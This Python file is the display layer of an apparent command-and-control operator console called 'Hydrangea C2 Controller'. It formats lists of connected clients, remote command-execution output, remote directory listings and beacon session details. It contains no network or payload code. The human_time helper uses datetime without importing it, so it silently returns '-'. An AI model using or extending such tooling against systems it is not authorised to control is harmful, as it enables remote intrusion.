#!/usr/bin/env python3

import json
import sys
import shutil
import re as _re


def _isatty():
    try:
        return sys.stdout.isatty()
    except Exception:
        return False


class UI:
    def __init__(
        self, use_color: bool = True, show_banner: bool = True, quiet: bool = False
    ):
        self.use_color = use_color and _isatty()
        self.show_banner_flag = show_banner
        self.quiet = quiet
        self.C = {
            "reset": "\x1b[0m",
            "dim": "\x1b[2m",
            "bold": "\x1b[1m",
            "red": "\x1b[31m",
            "green": "\x1b[32m",
            "yellow": "\x1b[33m",
            "blue": "\x1b[34m",
            "magenta": "\x1b[35m",
            "cyan": "\x1b[36m",
            "gray": "\x1b[90m",
        }

    def c(self, s, color):
        if not self.use_color:
            return s
        return f"{self.C.get(color, '')}{s}{self.C['reset']}"

    @property
    def TAG_OK(self):
        return self.c("[+]", "green")

    @property
    def TAG_ERR(self):
        return self.c("[!]", "red")

    @property
    def TAG_INF(self):
        return self.c("[*]", "cyan")

    @property
    def TAG_QUE(self):
        return self.c("[~]", "yellow")

    def banner(self):
        if not self.show_banner_flag or self.quiet:
            return
        art = r"""

   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████ 
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███ 
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███ 
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████ 
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███ 
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███ 
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀  
                                      ███    ███                                                               

              Hydrangea C2 Controller  •  V2.1 (REPL)
"""
        print(self.c(art, "magenta"))

    def rule(self, label=""):
        width = shutil.get_terminal_size((80, 20)).columns
        text = f" {label} " if label else ""
        line = "-" * max(0, width - len(text))
        print(self.c(text, "gray") + self.c(line, "gray"))

    def headline(self, text):
        print(self.c(text, "bold"))

    def kv(self, key, value, key_color="blue"):
        print(f"{self.c(key + ':', key_color)} {value}")

    def hr(self):
        width = shutil.get_terminal_size((80, 20)).columns
        print(self.c("─" * width, "gray"))

    def statusbar(self, left: str, right: str = ""):
        width = shutil.get_terminal_size((80, 20)).columns
        left = self.c(left, "gray")
        right = self.c(right, "gray")
        space = max(1, width - len(_strip_ansi(left)) - len(_strip_ansi(right)))
        print(left + (" " * space) + right)


# small helper to measure strings without ANSI escape codes
_ANSI_RE = _re.compile(r"\x1b\[[0-9;]*m")


def _strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s)


def human_size(n):
    try:
        n = int(n)
    except Exception:
        return str(n)
    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if n < 1024.0:
            return f"{n:.0f}{unit}"
        n /= 1024.0
    return f"{n:.0f}PB"


def human_time(epoch):
    try:
        return datetime.fromtimestamp(int(epoch)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "-"


def print_clients(ui: UI, resp: dict):
    if resp.get("type") != "CLIENTS":
        print_error(ui, resp)
        return []
    clients = resp.get("clients", [])
    ui.headline(f"{ui.TAG_OK} Connected clients: {len(clients)}")
    if not clients:
        return []
    for cid in clients:
        print(f"  {ui.c('•', 'gray')} {ui.c(cid, 'bold')}")
    return clients


def print_error(ui: UI, resp: dict):
    err = resp.get("error") or resp.get("type")
    detail = {k: v for k, v in resp.items() if k not in ("type", "size")}
    msg = f"{ui.TAG_ERR} {err}"
    if detail:
        msg += f" {ui.c(str(detail), 'dim')}"
    print(msg)


def print_queued(ui: UI, resp: dict):
    order = resp.get("order", "?")
    extra = []
    for k in ("path", "src", "save_as", "dest", "bytes"):
        if k in resp:
            extra.append(f"{k}={resp[k]}")
    tail = "  " + " ".join(extra) if extra else ""
    print(f"{ui.TAG_QUE} queued: {order}{ui.c(tail, 'dim')}")


def print_exec(ui: UI, client: str, resp: dict, payload: bytes):
    if resp.get("type") != "RESULT_EXEC":
        print_error(ui, resp)
        return
    try:
        result = json.loads(payload.decode("utf-8")) if payload else {}
    except Exception:
        result = {}

    rc = result.get("rc")
    stdout = result.get("stdout", "")
    stderr = result.get("stderr", "")

    status_tag = (
        ui.TAG_OK if rc == 0 else (ui.TAG_INF if rc is not None else ui.TAG_ERR)
    )
    ui.rule(" exec ")
    ui.headline(f"{status_tag} exec on {ui.c(client, 'bold')}  rc={rc}")
    if stderr:
        ui.rule(" stderr ")
        print(stderr.rstrip("\n"))
    ui.rule(" stdout ")
    print(stdout.rstrip("\n") or ui.c("(no output)", "dim"))
    ui.rule()


def print_list(ui: UI, path: str, resp: dict, payload: bytes):
    if resp.get("type") != "RESULT_LIST_DIR":
        if resp.get("type") == "QUEUED":
            print_queued(ui, resp)
            return
        print_error(ui, resp)
        return
    try:
        entries = json.loads(payload.decode("utf-8")) if payload else []
    except Exception:
        entries = []

    ui.rule(" list ")
    ui.headline(
        f"{ui.TAG_OK} {ui.c('Listing', 'bold')} {ui.c(path, 'cyan')}  {ui.c('(' + str(len(entries)) + ' entries)', 'dim')}"
    )

    name_w = max(
        10, min(50, max((len(e.get("name", "")) for e in entries), default=10))
    )
    print(
        f"{ui.c('TYPE', 'dim'):>6}  {ui.c('NAME', 'dim'):<{name_w}}  {ui.c('SIZE', 'dim'):>8}  {ui.c('MTIME', 'dim')}"
    )
    for e in entries:
        tp = "DIR" if e.get("is_dir") else "FIL"
        nm = e.get("name", "")
        sz = human_size(e.get("bytes", 0))
        mt = human_time(e.get("mtime", 0))
        print(f"{tp:>6}  {nm:<{name_w}}  {sz:>8}  {mt}")
    ui.rule()


def print_session(ui: UI, client: str, resp: dict, payload: bytes):
    if resp.get("type") != "RESULT_SESSION_INFO":
        print_error(ui, resp)
        return
    try:
        info = json.loads(payload.decode("utf-8")) if payload else {}
    except Exception:
        info = {}

    ui.rule(" session ")
    ui.headline(f"{ui.TAG_OK} session info for {ui.c(client, 'bold')}")
    ui.kv(
        "Host",
        f"{info.get('hostname', '?')} ({info.get('system', '?')} {info.get('release', '?')}, {info.get('machine', '?')})",
    )
    ui.kv("User/PID", f"{info.get('user', '?')} / {info.get('pid', '?')}")
    ui.kv("CWD", info.get("cwd", "?"))
    ui.kv("Root base", info.get("root", "?"))
    ui.kv("Beacon", f"{info.get('python', '?')} @ {info.get('executable', '?')}")
    ui.rule()
